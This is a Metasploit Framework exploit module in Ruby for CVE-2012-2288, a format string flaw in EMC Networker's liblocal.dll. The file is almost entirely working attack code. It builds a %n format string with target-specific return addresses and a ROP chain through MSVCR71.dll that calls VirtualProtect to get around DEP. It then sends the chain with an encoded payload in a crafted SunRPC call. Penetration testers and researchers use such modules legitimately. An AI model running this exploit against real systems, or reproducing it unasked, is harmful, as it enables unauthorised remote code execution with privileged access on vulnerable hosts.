##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::SunRPC

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC Networker Format String',
			'Description'    => %q{
					This module exploits a format string vulnerability in the lg_sprintf function
				as implemented in liblocal.dll on EMC Networker products. This module exploits the
				vulnerability by using a specially crafted RPC call to the program number 0x5F3DD,
				version 0x02, and procedure 0x06. This module has been tested successfully on EMC
				Networker 7.6 SP3 on Windows XP SP3 and Windows 2003 SP2 (DEP bypass).
			},
			'Author'         =>
				[
					'Aaron Portnoy', # Vulnerability Discovery and analysis
					'Luigi Auriemma <aluigi[at]autistici.org>', # Vulnerability Discovery and analysis
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2012-2288' ],
					[ 'OSVDB', '85116' ],
					[ 'BID', '55330' ],
					[ 'URL', 'http://blog.exodusintel.com/2012/08/29/when-wrapping-it-up-goes-wrong/' ],
					[ 'URL', 'http://aluigi.altervista.org/misc/aluigi0216_story.txt' ]
				],
			'Platform'       => [ 'win' ],
			'Payload'        =>
				{
					'BadChars' => "\x00\x0d\x0a\x25\x2a",
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Targets'        =>
				[
					['EMC Networker 7.6 SP3 / Windows Universal',
						{
							'Ret' => 0x7c354dac, # ret from MSVCR71.dll
							'Offset' => 156,
							'DEP' => true
						}
					],
					['EMC Networker 7.6 SP3 / Windows XP SP3',
						{
							'Ret' => 0x7c345c30, # push esp # ret from MSVCR71.dll
							'Offset' => 156,
							'DEP' => false
						}
					],
					['EMC Networker 7.6 SP3 / Windows 2003 SP2',
						{
							'Ret' => 0x7c354dac, # ret from MSVCR71.dll
							'Offset' => 156,
							'DEP' => true
						}
					]
				],
			'DefaultTarget'  => 0,
			'Privileged'     => true,
			'DisclosureDate' => 'Aug 29 2012'))

	end

	def exploit

		begin
			if (not sunrpc_create('tcp', 0x5F3DD, 2))
				fail_with(Exploit::Failure::Unknown, 'sunrpc_create failed')
			end

			fs = "%n" * target['Offset']
			fs << [target.ret].pack("V") # push esp # ret from MSVCR71.dll
			if target['DEP']
				rop_gadgets =
					[
						# rop chain generated with mona.py
						# The RopDb mixin isn't used because there are badchars
						# which must be avoided
						0x7c354dab,	# POP EBP # RETN [MSVCR71.dll]
						0x7c354dab,	# skip 4 bytes [MSVCR71.dll]
						0x7c37678f,	# POP EAX # RETN [MSVCR71.dll]
						0xfffffdff,	# Value to negate, will become 0x00000201
						0x7c34d749,	# NEG EAX # RETN [MSVCR71.dll]
						0x7c362688,	# POP EBX # RETN [MSVCR71.dll]
						0xffffffff,	#
						0x7c345255,	# INC EBX # FPATAN # RETN [MSVCR71.dll]
						0x7c363cff,	# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [MSVCR71.dll]
						0x7c34592b,	# POP EDX # RETN [MSVCR71.dll]
						0xffffffc0,	# Value to negate, will become 0x00000040
						0x7c351eb1,	# NEG EDX # RETN [MSVCR71.dll]
						0x7c37765f,	# POP ECX # RETN [MSVCR71.dll]
						0x7c38ecfe,	# &Writable location [MSVCR71.dll]
						0x7c34a490,	# POP EDI # RETN [MSVCR71.dll]
						0x7c347f98,	# RETN (ROP NOP) [MSVCR71.dll]
						0x7c364612,	# POP ESI # RETN [MSVCR71.dll]
						0x7c3415a2,	# JMP [EAX] [MSVCR71.dll]
						0x7c344cc1,	# POP EAX # RETN [MSVCR71.dll]
						0x7c37a151, # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
						0x7c378c81,	# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]
						0x7c345c30,	# ptr to 'push esp #  ret ' [MSVCR71.dll]
					].pack("V*")
				fs << rop_gadgets
			end
			fs << payload.encoded

			xdr = XDR.encode(0, 2, rand_text_alpha(10), XDR.encode(fs, rand_text_alpha(10)), 2)
			sunrpc_call(6, xdr)
			sunrpc_destroy

		rescue Rex::Proto::SunRPC::RPCTimeout
			print_error('RPCTimeout')
		rescue EOFError
			print_error('EOFError')
		end
	end

end
